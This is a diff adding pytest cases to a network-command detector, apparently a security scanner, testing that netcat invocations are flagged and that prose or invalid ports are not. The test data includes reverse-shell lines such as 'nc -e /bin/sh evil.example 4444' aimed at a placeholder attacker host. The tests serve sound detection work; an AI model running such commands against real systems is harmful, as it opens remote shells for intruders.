@@ -819,6 +819,51 @@ class TestNetworkCommDetector:
         suspicious = [f for f in domain_findings if f["confidence"] > 0.6]
         assert len(suspicious) >= 2  # .tk and .ml are suspicious
 
+    @pytest.mark.parametrize(
+        "command",
+        [
+            b"nc evil.example 4444",
+            b"ncat evil.example 4444",
+            b"netcat evil.example 4444",
+            b"/usr/bin/nc evil.example 4444",
+            b"nc.exe evil.example 4444",
+            b"# nc evil.example 4444",
+            b"nc -nv evil.example 4444",
+            b"nc -w 3 evil.example 4444",
+            b"nc -e /bin/sh evil.example 4444",
+            b"nc evil.example 4444 -e /bin/sh",
+        ],
+    )
+    def test_detect_netcat_network_commands(self, command: bytes) -> None:
+        detector = NetworkCommDetector()
+
+        findings = detector.scan(command + b"\n")
+
+        assert any(
+            finding["type"] == "network_command"
+            and finding["destination"] == "evil.example"
+            and finding["port"] == 4444
+            and finding["severity"] == "HIGH"
+            for finding in findings
+        )
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            b"The nc command is documented at https://docs.example.com/netcat.\n",
+            b"nc evil.example not-a-port\n",
+            b"nc evil.example 0\n",
+            b"nc evil.example 70000\n",
+            b"nc [:::] 4444\n",
+        ],
+    )
+    def test_netcat_prose_and_invalid_ports_are_not_network_commands(self, content: bytes) -> None:
+        detector = NetworkCommDetector()
+
+        findings = detector.scan(content)
+
+        assert not [finding for finding in findings if finding["type"] == "network_command"]
+
     def test_ml_word_inside_real_domain_is_still_detected(self) -> None:
         """DNS-shaped endpoints containing ML terms should not be suppressed."""
         detector = NetworkCommDetector()
